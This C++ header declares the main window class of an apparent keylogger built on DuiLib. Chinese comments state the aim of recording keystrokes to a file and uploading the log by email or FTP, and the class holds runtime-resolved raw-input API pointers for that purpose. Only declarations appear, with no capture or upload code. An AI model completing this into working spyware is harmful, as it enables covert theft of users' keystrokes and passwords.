#ifndef MainWnd_h__
#define MainWnd_h__

#include "Utils\WinImplBase.h"

#pragma once
//加键盘记录的功能
//一个完整的键盘记录，有一个记录文件上传的功能，发邮件，FTP
//
typedef BOOL(_stdcall * PRegisterRawInputDevices)(PCRAWINPUTDEVICE, UINT, UINT);
typedef UINT(_stdcall * PGetRawInputData)(HRAWINPUT, UINT, LPVOID, PUINT, UINT);
class CMainWnd : public WindowImplBase
{
public:
	CMainWnd(void);
	~CMainWnd(void);

public:
	CDuiString GetSkinFolder(){ return _T(""); };
	CDuiString GetSkinFile(){ return CDuiString(_T("MainSkin.xml")); };
	LPCTSTR GetWindowClassName() const{return _T("KeyLoger");};
	LRESULT HandleMessage(UINT uMsg, WPARAM wParam, LPARAM lParam);
	void InitWindow();
	void Notify(TNotifyUI& msg);

	bool OnCloseBtnClick(TNotifyUI* pTNotifyUI, LPARAM lParam, WPARAM wParam);

private:

	CButtonUI*		pCloseBtn;
	CLabelUI *		pMsgLabel;
	HANDLE			hFile;   //用于保存获取的按键记录的文件的句柄
	PGetRawInputData GetRawInputData;//用于保存获取的GetRawInputData的内存地址 
	PRegisterRawInputDevices RegisterRawInputDevices;//用于保存获取的RegisterRawInputDevices的内存地址 
};

#endif // MainWnd_h__
